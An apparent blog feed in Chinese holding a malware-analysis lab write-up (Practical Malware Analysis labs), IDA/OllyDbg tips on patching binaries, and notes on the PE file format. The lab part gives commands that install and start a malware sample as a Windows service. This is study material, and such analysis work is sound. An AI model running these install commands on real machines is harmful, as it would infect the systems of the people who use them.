Walker和Peid查看,发现导入函数很少，接着发现加壳<br><img src="https://i.imgur.com/1VeV9Fp.png" alt=""><br>用strings工具查看，发现一个网站和admin，注册表<br><img src="https://i.imgur.com/GfEHrtj.png" alt=""></p><h4 id="这个恶意代码在主机上的感染迹象特征是什么"><a href="#这个恶意代码在主机上的感染迹象特征是什么" class="headerlink" title="这个恶意代码在主机上的感染迹象特征是什么"></a>这个恶意代码在主机上的感染迹象特征是什么</h4><p>先将虚拟机拍快照，然后准备运行，win7上发现运行不了<br><img src="https://i.imgur.com/7yBNGk5.png" alt=""><br>然后找个xp pro x86的运行<br><img src="https://i.imgur.com/nnmlZWy.png" alt=""><br>可以看出程序一共修改了17处的注册表，其中，增加了2个键，3个值，改变了12个指，新建的键是上面这2个，新建了两个打印的键，新添加的值是上面这3个，一个是开机启动的值，为C:\WINDOWS\system32\vmx32to64.ex。</p><h4 id="是否存在一些有用的网络特征码？"><a href="#是否存在一些有用的网络特征码？" class="headerlink" title="是否存在一些有用的网络特征码？"></a>是否存在一些有用的网络特征码？</h4><p>网络特征码就是那个恶意域名的解析过程和https的连接</p><h3 id="lab3-1-1"><a href="#lab3-1-1" class="headerlink" title="lab3-1"></a>lab3-1</h3><h4 id="你怎样才能让这个恶意代码自行安装"><a href="#你怎样才能让这个恶意代码自行安装" class="headerlink" title="你怎样才能让这个恶意代码自行安装"></a>你怎样才能让这个恶意代码自行安装</h4><p>有PEview查看dll的导入表<br><img src="https://i.imgur.com/glgDAB1.png" alt=""><br>用Dependency Walker查看依赖，会发现一些创建线程函数，注册表，网络服务。<br><img src="https://i.imgur.com/DHYqe5h.png" alt=""><br>用strings来看看，发现一个域名practicalmalwareanalysis.com，serve.html，getfile，cmd.exe /c,还有一些注册表操作的语句<br><img src="https://i.imgur.com/bTutnPU.png" alt=""><br>这是运行:<br><code>rundll32.exe Lab03-02.dll,install</code></p><h4 id="在安装之后，你如何让这个恶意代码运行起来？"><a href="#在安装之后，你如何让这个恶意代码运行起来？" class="headerlink" title="在安装之后，你如何让这个恶意代码运行起来？"></a>在安装之后，你如何让这个恶意代码运行起来？</h4><p>用windows启动服务的方式来启动<br><code>net start IPRIP</code></p><h4 id="你怎么能找到这个恶意代码是在哪个进程下运行的？"><a href="#你怎么能找到这个恶意代码是在哪个进程下运行的？" class="headerlink" title="你怎么能找到这个恶意代码是在哪个进程下运行的？"></a>你怎么能找到这个恶意代码是在哪个进程下运行的？</h4><p>用Process Explorer，Find菜单-&gt; Find Handle or DLL…寻找我们那个DLL文件</p><h4 id="你可以在procmon工具中设置什么样的过滤器，才能收集这个恶意代码的信息？"><a href="#你可以在procmon工具中设置什么样的过滤器，才能收集这个恶意代码的信息？" class="headerlink" title="你可以在procmon工具中设置什么样的过滤器，才能收集这个恶意代码的信息？"></a>你可以在procmon工具中设置什么样的过滤器，才能收集这个恶意代码的信息？</h4><p>用发现的PID就行过滤，</p><h4 id="这个恶意代码在主机上的感染迹象是什么？"><a href="#这个恶意代码在主机上的感染迹象是什么？" class="headerlink" title="这个恶意代码在主机上的感染迹象是什么？"></a>这个恶意代码在主机上的感染迹象是什么？</h4><p>感染迹象就是会有创建一个服务叫IPRIP</p><h4 id="这个恶意代码是否存在一些有用的网路特征码？"><a href="#这个恶意代码是否存在一些有用的网路特征码？" class="headerlink" title="这个恶意代码是否存在一些有用的网路特征码？"></a>这个恶意代码是否存在一些有用的网路特征码？</h4><p>我们先去看看DNSChef和INetSim服务器上的 记录，先检查一下dns的解析记录，用DNSChef虚拟机看，和我们前面发现的恶意域名是对应的，记录在log/service.log里面，这个DLL从我们的fake服务器下载一个serve.html，而我们伟大的INetSim返回了sample.html作为serve.html，其实这里就不需要用netcat来监听本地80端口了<br>所以这个网络特征就是那个漫长的恶意域名的解析，和对恶意域名请求一个serve.html</p><h2 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h2><p>这里可以下载到所有的工具:<br><a href="https://github.com/vito-L/malware-analysis/blob/master/Tools.md" target="_blank" rel="external">https://github.com/vito-L/malware-analysis/blob/master/Tools.md</a><br>恶意代码分析实战</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;啥？你电脑中病毒啦，被勒索啦，那就来好好学习恶意代码分析，讲得很好。留下了没有技术的眼泪&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>RE_IDA_OD的常用小技巧</title>
    <link href="http://yoursite.com/2018/03/26/re_ida/"/>
    <id>http://yoursite.com/2018/03/26/re_ida/</id>
    <published>2018-03-26T06:18:54.190Z</published>
    <updated>2018-03-28T01:23:20.655Z</updated>
    
    <content type="html"><![CDATA[<p>IDA和OD是逆向中必不可少的一部分，现在来分享一下IDA和OD的一些技巧<br><a id="more"></a></p><h1 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h1><h2 id="1、查找字符串"><a href="#1、查找字符串" class="headerlink" title="1、查找字符串"></a>1、查找字符串</h2><p>(Shift+f9)View-&gt;open subviews-&gt;Strings</p><h2 id="2、修改文件，打补丁-patch"><a href="#2、修改文件，打补丁-patch" class="headerlink" title="2、修改文件，打补丁(patch)"></a>2、修改文件，打补丁(patch)</h2><p>1、找到修改地方<br>2、修改文件，也可以在(Hex view)窗口修改16进制:双击要修改的地方 -&gt;使用F2捷方式修改当前字节 -&gt;再按下F2快捷方式应用修改。<br>3、保存文件修改后的文件:[IDA Main Menu]-&gt;[Edit]-&gt;[PatchProgram]-&gt;[Apply patches to input file…]<br>IDA图形视图会有执行流，Yes箭头默认为绿色，No箭头默认为红色，蓝色表示默认下一个执行块。</p><h2 id="3、ida无法识别，红色代码，不能f5"><a href="#3、ida无法识别，红色代码，不能f5" class="headerlink" title="3、ida无法识别，红色代码，不能f5"></a>3、ida无法识别，红色代码，不能f5</h2><p>如果地址是红色，当f5时会出现这句话：The function has undefined instruction/data at the specified address.那就创建一个函数(P)，当创建函数时，会出现这句话：The function has undefined instruction/data at the specified address.Your request has been put in the autoanalysis queue<br>如果我们不能创建函数,就不能使用F5来分析代码了,想让这些代码变绿色的方法(创建函数)很简单.<br>用鼠标从函数头部开始到 retn 结尾 拖一下,变成灰色.<br><img src="https://i.imgur.com/1odLgE0.png" alt=""><br>然后用快捷键 P 或者右键菜单,CreateFunction 来创建函数就可以了。当然了,到这里也不算完.下图是代码变绿色的,我用上面的方法创建函数了,可还是不能F5,我们通过Stack Pointer (option-&gt;General-&gt;Disassembly选中stack pointer)发现这个函数的堆栈是不平衡的.此时我们需要找接近retn 的 最后一个Call 然后去修正堆栈.此时我们需要找接近retn 的 最后一个Call 然后去修正堆栈.我们看到 retn 左边绿色的数字是 28,我们通过ALT + k 修正堆栈,把 28 retn 改成 0 就可以了。修正堆栈的时候一定要选择 Call 然后修正堆栈,下图是修正后的 代码</p><h2 id="4、常用快捷键"><a href="#4、常用快捷键" class="headerlink" title="4、常用快捷键"></a>4、常用快捷键</h2><p>1、快捷键F5显示C伪代码<br>2、(Shift+f9)查找字符串<br>3、快捷键Alt+T，打开文本搜索对话框，在String文本框中输入要搜索的字符串点击OK即可<br>4、翻页 esc 和 Ctrl+Enter<br>5、使用小键盘“-”，“+”查看函数之间的关系<br>6、G跳转地址<br>7、使用快捷键”*”把变量重定义为数组<br>8、对于数字，16进制和10进制转换(H),转化成10字符(R)</p><h1 id="OD-olldbg"><a href="#OD-olldbg" class="headerlink" title="OD(olldbg)"></a>OD(olldbg)</h1><h2 id="1、常用快捷键"><a href="#1、常用快捷键" class="headerlink" title="1、常用快捷键"></a>1、常用快捷键</h2><p>0、f2下断点<br>1、f7进入call<br>2、f8不进入call<br>3、f9运行<br>4、f4运行到当前位置<br>5、’-‘回到上一步的位置<br>6、’*’回到当前运行的位置<br>7、Ctrl+F2  重新运行程序到起始处，用于重新调试程序<br>8、Ctrl+G 寻找十六进制地址<br>9、Alt+F2 关闭被调试程序。<br>10、f3 选择可执行文件<br>11、ctrl+b 在地址栏进行查找字符串<br>12、m -&gt; 查找</p><h2 id="OD上面图标"><a href="#OD上面图标" class="headerlink" title="OD上面图标"></a>OD上面图标</h2><p>1、’b’查看断点<br>2、’m’打开内存<br>3、’c’回到反汇编窗口</p><h2 id="OD保存文件"><a href="#OD保存文件" class="headerlink" title="OD保存文件"></a>OD保存文件</h2><p>1、寻找到需要patch的地方<br>2、修改(patch)文件<br>3、 保存文件: 窗口中选中修改过的语句—&gt;右击—&gt;复制到可执行文件—&gt;“选择”或者“所有修改”—&gt;出现“文件”窗口—&gt;右击—&gt;保存文件</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;IDA和OD是逆向中必不可少的一部分，现在来分享一下IDA和OD的一些技巧&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>RE_PE</title>
    <link href="http://yoursite.com/2018/03/21/re_PE/"/>
    <id>http://yoursite.com/2018/03/21/re_PE/</id>
    <published>2018-03-21T00:13:56.256Z</published>
    <updated>2018-03-21T08:26:31.001Z</updated>
    
    <content type="html"><![CDATA[<p>复习可执行文件的文件结构——PE。PE文件是微软Windows操作系统上的程序文件，意为可移植的可执行的文件。PE的段头直接沿用的COFF 的段头结构。<br><a id="more"></a></p><h1 id="1、PE的结构"><a href="#1、PE的结构" class="headerlink" title="1、PE的结构"></a>1、PE的结构</h1><p><img src="https://i.imgur.com/vfm1qtj.jpg" alt=""><br>DOS头: 是DOS命令窗口下可以执行，其实没有PE文件也是可以执行的（听说是老一辈习惯啦DOS命令下执行，就加上去啦）。<br>NT头: 是PE中最大的结构体啦，其中有签名，文件头和可选头。<br>节区头: 定义(代码，数据，资源等的大小，起始位置，权限等)</p><h1 id="2、DOS头"><a href="#2、DOS头" class="headerlink" title="2、DOS头"></a>2、DOS头</h1><p>DOS结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span> &#123;</span>          <span class="comment">// DOS .EXE header  </span></div><div class="line">        WORD   e_magic;                     <span class="comment">// Magic number  </span></div><div class="line">        WORD   e_cblp;                      <span class="comment">// Bytes on last page of file  </span></div><div class="line">        WORD   e_cp;                        <span class="comment">// Pages in file  </span></div><div class="line">        WORD   e_crlc;                      <span class="comment">// Relocations  </span></div><div class="line">        WORD   e_cparhdr;                   <span class="comment">// Size of header in paragraphs  </span></div><div class="line">        WORD   e_minalloc;                  <span class="comment">// Minimum extra paragraphs needed  </span></div><div class="line">        WORD   e_maxalloc;                  <span class="comment">// Maximum extra paragraphs needed  </span></div><div class="line">        WORD   e_ss;                        <span class="comment">// Initial (relative) SS value  </span></div><div class="line">        WORD   e_sp;                        <span class="comment">// Initial SP value  </span></div><div class="line">        WORD   e_csum;                      <span class="comment">// Checksum  </span></div><div class="line">        WORD   e_ip;                        <span class="comment">// Initial IP value  </span></div><div class="line">        WORD   e_cs;                        <span class="comment">// Initial (relative) CS value  </span></div><div class="line">        WORD   e_lfarlc;                      <span class="comment">// File address of relocation table  </span></div><div class="line">        WORD   e_ovno;                      <span class="comment">// Overlay number  </span></div><div class="line">        WORD   e_res[<span class="number">4</span>];                     <span class="comment">// Reserved words  </span></div><div class="line">        WORD   e_oemid;                     <span class="comment">// OEM identifier (for e_oeminfo)  </span></div><div class="line">        WORD   e_oeminfo;                   <span class="comment">// OEM information; e_oemid specific  </span></div><div class="line">        WORD   e_res2[<span class="number">10</span>];                   <span class="comment">// Reserved words  </span></div><div class="line">        LONG   e_lfanew;                     <span class="comment">// File address of new exe header  </span></div><div class="line">&#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</div></pre></td></tr></table></figure></p><h2 id="e-magic：所有PE开头都有DOS签名-“MZ”，这是以一个名叫Mark-Zbikowski的DOS可执行文件的设计者首字母命名的"><a href="#e-magic：所有PE开头都有DOS签名-“MZ”，这是以一个名叫Mark-Zbikowski的DOS可执行文件的设计者首字母命名的" class="headerlink" title="e_magic：所有PE开头都有DOS签名  “MZ”，这是以一个名叫Mark Zbikowski的DOS可执行文件的设计者首字母命名的"></a>e_magic：所有PE开头都有DOS签名  “MZ”，这是以一个名叫Mark Zbikowski的DOS可执行文件的设计者首字母命名的</h2><h2 id="e-lfanew-指向NT头的位置，long类型，占4个字节。例"><a href="#e-lfanew-指向NT头的位置，long类型，占4个字节。例" class="headerlink" title="e_lfanew:指向NT头的位置，long类型，占4个字节。例:"></a>e_lfanew:指向NT头的位置，long类型，占4个字节。例:</h2><p><img src="https://i.imgur.com/DancFFy.png" alt=""></p><h1 id="3、NT头"><a href="#3、NT头" class="headerlink" title="3、NT头"></a>3、NT头</h1><p>NT结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span>  </div><div class="line">      DWORD                 Signature;  </div><div class="line">      IMAGE_FILE_HEADER     FileHeader;  </div><div class="line">      IMAGE_OPTIONAL_HEADER OptionalHeader;  </div><div class="line">&#125; IMAGE_NT_HEADERS, *PIMAGE_NT_HEADERS;</div></pre></td></tr></table></figure></p><p>第一个参数是: 一个PE标志。在一个有效的PE文件里，Signature字段被设置为00004550h。<br>第二个参数是: IMAGE_FILE_HEADER结构体。<br>第三个参数是: OptionalHeader结构体。</p><h2 id="NT文件头"><a href="#NT文件头" class="headerlink" title="NT文件头"></a>NT文件头</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></div><div class="line">    WORD    Machine;　　　　　　　　　<span class="comment">//机器型号,哪个CPU可以跑的.重要.</span></div><div class="line">    WORD    NumberOfSections;　　　　  <span class="comment">//节的数量 .data , .text </span></div><div class="line">    DWORD   TimeDateStamp;　　　　　　　<span class="comment">//程序的编译时间,参考用,没有实际作用</span></div><div class="line">    DWORD   PointerToSymbolTable;　　　<span class="comment">//符号表地址，主要是给比人用的</span></div><div class="line">    DWORD   NumberOfSymbols;　　　　　　　<span class="comment">//符号表大小</span></div><div class="line">    WORD    SizeOfOptionalHeader;　　　<span class="comment">//可选头大小,这个字段很重要.才知道可选头是多大</span></div><div class="line">    WORD    Characteristics;　　　　　　<span class="comment">//文件属性,描述文件信息的.</span></div><div class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</div></pre></td></tr></table></figure><h2 id="NT可选头结构体"><a href="#NT可选头结构体" class="headerlink" title="NT可选头结构体"></a>NT可选头结构体</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span>  </span></div><div class="line"><span class="class">&#123;</span>  </div><div class="line">        <span class="comment">//   </span></div><div class="line">        <span class="comment">// Standard fields.     </span></div><div class="line">        <span class="comment">//   </span></div><div class="line">        WORD    Magic;              <span class="comment">// 标志字, ROM 映像（0107h）,普通可执行文件（010Bh）   </span></div><div class="line">        BYTE    MajorLinkerVersion;     <span class="comment">// 链接程序的主版本号   </span></div><div class="line">        BYTE    MinorLinkerVersion;     <span class="comment">// 链接程序的次版本号   </span></div><div class="line">        DWORD   SizeOfCode;         <span class="comment">// 所有含代码的节的总大小   </span></div><div class="line">        DWORD   SizeOfInitializedData;          <span class="comment">// 所有含已初始化数据的节的总大小   </span></div><div class="line">        DWORD   SizeOfUninitializedData;        <span class="comment">// 所有含未初始化数据的节的大小   </span></div><div class="line">        DWORD   AddressOfEntryPoint;        <span class="comment">// 程序执行入口RVA   </span></div><div class="line">        DWORD   BaseOfCode;         <span class="comment">// 代码的区块的起始RVA   </span></div><div class="line">        DWORD   BaseOfData;         <span class="comment">// 数据的区块的起始RVA    </span></div><div class="line">        DWORD   ImageBase;          <span class="comment">// 程序的首选装载地址   </span></div><div class="line">        DWORD   SectionAlignment;       <span class="comment">// 内存中的区块的对齐大小   </span></div><div class="line">        DWORD   FileAlignment;          <span class="comment">// 文件中的区块的对齐大小   </span></div><div class="line">        WORD    MajorOperatingSystemVersion;    <span class="comment">// 要求操作系统最低版本号的主版本号   </span></div><div class="line">        WORD    MinorOperatingSystemVersion;    <span class="comment">// 要求操作系统最低版本号的副版本号   </span></div><div class="line">        WORD    MajorImageVersion;      <span class="comment">// 可运行于操作系统的主版本号   </span></div><div class="line">        WORD    MinorImageVersion;      <span class="comment">// 可运行于操作系统的次版本号   </span></div><div class="line">        WORD    MajorSubsystemVersion;      <span class="comment">// 要求最低子系统版本的主版本号   </span></div><div class="line">        WORD    MinorSubsystemVersion;      <span class="comment">// 要求最低子系统版本的次版本号   </span></div><div class="line">        DWORD   Win32VersionValue;      <span class="comment">// 莫须有字段，不被病毒利用的话一般为0   </span></div><div class="line">        DWORD   SizeOfImage;            <span class="comment">// 映像装入内存后的总尺寸   </span></div><div class="line">        DWORD   SizeOfHeaders;          <span class="comment">// 所有头+ 区块表的尺寸大小   </span></div><div class="line">        DWORD   CheckSum;           <span class="comment">// 映像的校检和   </span></div><div class="line">        WORD    Subsystem;          <span class="comment">// 可执行文件期望的子系统   </span></div><div class="line">        WORD    DllCharacteristics;     <span class="comment">// DllMain()函数何时被调用，默认为0   </span></div><div class="line">        DWORD   SizeOfStackReserve;     <span class="comment">// 初始化时的栈大小   </span></div><div class="line">        DWORD   SizeOfStackCommit;      <span class="comment">// 初始化时实际提交的栈大小   </span></div><div class="line">        DWORD   SizeOfHeapReserve;      <span class="comment">// 初始化时保留的堆大小   </span></div><div class="line">        DWORD   SizeOfHeapCommit;       <span class="comment">// 初始化时实际提交的堆大小   </span></div><div class="line">        DWORD   LoaderFlags;            <span class="comment">// 与调试有关，默认为0    </span></div><div class="line">        DWORD   NumberOfRvaAndSizes;    <span class="comment">// 下边数据目录的项数，这个字段自Windows NT 发布以来        // 一直是16   </span></div><div class="line">        IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];  </div><div class="line">        <span class="comment">// 数据目录表   </span></div><div class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</div></pre></td></tr></table></figure><h2 id="一共31个字段成员-6个重要的"><a href="#一共31个字段成员-6个重要的" class="headerlink" title="一共31个字段成员,6个重要的"></a>一共31个字段成员,6个重要的</h2><p>RVA也叫作OEP<br>AddressOfEntryPoint 持有EP 的RVA 值<br>基址<br>SizeOfHeader PE 头的大小<br>Subsystem 用来区分系统驱动文件与普通可执行文件。<br>DataDirectory数组</p><h2 id="重点是最后一个成员IMAGE-DATA-DIRECTORY-DataDirectory-IMAGE-NUMBEROF-DIRECTORY-ENTRIES"><a href="#重点是最后一个成员IMAGE-DATA-DIRECTORY-DataDirectory-IMAGE-NUMBEROF-DIRECTORY-ENTRIES" class="headerlink" title="重点是最后一个成员IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];"></a>重点是最后一个成员IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</h2><p>因为DataDirectory数组里保存了导入表（用了哪些dll），导出表，TLS（Thread Local Storage） Directory等RVA和大小的信息<br>倒数第二个变量决定NumberOfRvaAndSizes数组长度<br>在LoadPE工具中，文件头显示信息，如下：<br><img src="https://i.imgur.com/lhhFCrk.png" alt=""></p><h2 id="DataDirectory数组"><a href="#DataDirectory数组" class="headerlink" title="DataDirectory数组"></a>DataDirectory数组</h2><p>IMAGE_DATA_DIRCTORY结构如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span> &#123;</span>  </div><div class="line">        DWORD　VirtualAddress; <span class="comment">//相对虚拟地址  </span></div><div class="line">        DWORD　Size;　　　　　 <span class="comment">//大小  </span></div><div class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</div></pre></td></tr></table></figure></p><p>一个是RVA，一个是大小</p><p>data directory数据目录在WINNT.H中定义为<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXPORT         0 导出表  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_IMPORT         1 导入表   </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_RESOURCE       2 资源目录  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_EXCEPTION      3 异常目录  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_SECURITY       4 安全目录  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_BASERELOC      5 重定位基本表  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_DEBUG          6 调试目录  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_COPYRIGHT      7 描术字串  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_GLOBALPTR      8 机器值  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_TLS            9 TLS目录  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    10 载入配值目录  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT   11 绑定输入表  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_IAT            12 导入地址表  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   13 延迟载入描述  </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14 COM信息</span></div></pre></td></tr></table></figure></p><p>在LoadPE工具中，数据目录显示信息，如下：<br><img src="https://i.imgur.com/7yB4x1A.png" alt=""></p><h1 id="4、RVA和RAW"><a href="#4、RVA和RAW" class="headerlink" title="4、RVA和RAW"></a>4、RVA和RAW</h1><p>理解PE 最重要的一个部分就是理解文件从磁盘到内存地址的映射过程，做逆向的人员，只有熟练地掌握才能跟踪到程序的调用过程和位置，才能分析和寻找漏洞。<br>对于文件和内存的映射关系，其实很简单，他们通过一个简单的公式计算而来：<br><img src="https://i.imgur.com/U9LeUOb.jpg" alt=""><br>换算公式是这样的：<br>RAW - PointToRawData(磁盘文件中节区起始位置) = RVA(相对虚拟地址) - VirtualAddress</p><p>寻找过程就是先找到RVA 所在的段，然后根据公式计算出文件偏移。因为我们通过逆向工具，可以在内存中查找到所在的RVA，进而我们就可以计算出在文件中所在的位置，这样，就可以手动进行修改。</p><p>VA与RVA公式是这样的：</p><h2 id="RVA-VA（虚拟地址）-ImageBase（基址）"><a href="#RVA-VA（虚拟地址）-ImageBase（基址）" class="headerlink" title="RVA = VA（虚拟地址） - ImageBase（基址）"></a>RVA = VA（虚拟地址） - ImageBase（基址）</h2><p>结果:</p><h2 id="RAW-VA-ImageBase-VirtualAddress-PointerToRawData"><a href="#RAW-VA-ImageBase-VirtualAddress-PointerToRawData" class="headerlink" title="RAW = VA - ImageBase - VirtualAddress + PointerToRawData"></a>RAW = VA - ImageBase - VirtualAddress + PointerToRawData</h2><p>比如:<br>VA=0x003A20F4 , ImageBase =0x003A0000<br><img src="https://i.imgur.com/SwaxF8w.png" alt=""><br>可以看到0x20F4地址位于VirtualAddress 为0x2000的.rdata节，偏移为0x20F4 - 0x2000 = 0xF4<br>观察节表，.rdata的PointerToRawData为0xE00，字符串在磁盘中的地址为0xE00 + 0xF4 = 0xEF4<br>使用公式：<br>RAW = VA - ImageBase - VirtualAddress + PointerToRawData = 0x003A20F4 - 0x003A0000 - 0x2000 + 0xE00 = 0xEF4<br>用winhex打开二进制文件<br><img src="https://i.imgur.com/EQhlnD9.png" alt=""></p><h1 id="5、IAT与EAT"><a href="#5、IAT与EAT" class="headerlink" title="5、IAT与EAT"></a>5、IAT与EAT</h1><h2 id="IAT"><a href="#IAT" class="headerlink" title="IAT"></a>IAT</h2><p>一个普通PE文件的运行往往需要导入多个库文件，在PE文件运行时如何找到库文件中函数的准确入口是程序正确运行的保证。IAT就是提供这样保证的一个机制。IAT总得来说是一张表，表内存储着每个库文件函数在内存中的地址。<br>结构体<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></div><div class="line">    <span class="keyword">union</span> &#123;</div><div class="line">        DWORD   Characteristics;            <span class="comment">//导入表结束标志</span></div><div class="line">        DWORD   OriginalFirstThunk;         <span class="comment">//RVA指向一个结构体数组(INT表)</span></div><div class="line">    &#125;;</div><div class="line">    DWORD   TimeDateStamp;                  <span class="comment">//时间戳</span></div><div class="line">    DWORD   ForwarderChain;                 <span class="comment">// -1 if no forwarders</span></div><div class="line">    DWORD   Name;                           <span class="comment">//RVA指向dll名字，以0结尾</span></div><div class="line">    DWORD   FirstThunk;                     <span class="comment">//RVA指向一个结构体数组(IAT表)</span></div><div class="line">&#125; IMAGE_IMPORT_DESCRIPTOR, *PIMAGE_IMPORT_DESCRIPTOR;</div></pre></td></tr></table></figure></p><p>第一个成员是一个联合体：一般给出的是OriginalFirstThunk的值，这个值是INT的地址，INT（Import Name Table）是一个存储了库文件函数名称的表<br>第二个成员是时间戳<br>第三个成员是ForwarderChain<br>第四个成员是Name，存储的是库名称字符数组的地址<br>第五个成员是FirstThunk，存储的是IAT表的地址</p><p>第一步：<br>PE加载器读取结构体成员的值，Name成员找到库名称，然后将库文件加载到内存中来。<br>第二步：<br>PE加载器读取OriginalFirstThunk值获得INT地址，然后依次读取INT各项的值，根据函数的标号获取函数的地址<br>第三步：<br>根据FirstThunk的值获取IAT的地址，将上一步获得地址送入IAT中存储。</p><p>理解:读取IID(结构体)成员name获取库名-&gt;load(库)-&gt;读取IID的成员，获取INT的地址-&gt;读取函数名并获取地址-&gt;读取IID的成员，获取IAT的地址-&gt;将得到函数地址存入IAT中-&gt;重复直到INT为NULL</p><h2 id="EAT"><a href="#EAT" class="headerlink" title="EAT"></a>EAT</h2><p>EAT对应的结构体为IMAGE_EXPORT_DESCRIPTOR，位置信息存储在可选头DataDirectory[0]中。<br>一般PE文件此项值应为0，代表不存在这个表项，只有库文件，才会含有这个表项。<br>结构体成员包括特征值，时间戳，版本信息等。重要的成员是Name，存储着库文件的名字；Base存储着函数标号从哪里开始；NumberOfFunctions存储着函数的数量；NumberOfNames存储着函数名称的数量（一般情况下这两项相同）；AddressOfFunctions函数地址数组的首地址；AddressOfNames函数名称地址数组的首地址；AdressOfNameOrdinals，存储着函数标号的地址信息。</p><p>个人思考:记得以前学习的时候，把VA与VirtualAddress看成一个相同的，导致转化的时候很矛盾，现在再看，真是自己可以静心好好的学，再次理解IAT的运行机制。</p><p>参考：<br><a href="https://www.jianshu.com/p/af9766222816" target="_blank" rel="external">https://www.jianshu.com/p/af9766222816</a><br><a href="https://www.cnblogs.com/aguoshaofang/p/5021759.html" target="_blank" rel="external">https://www.cnblogs.com/aguoshaofang/p/5021759.html</a></p>]]></content>
    
    <summary type="html">
    
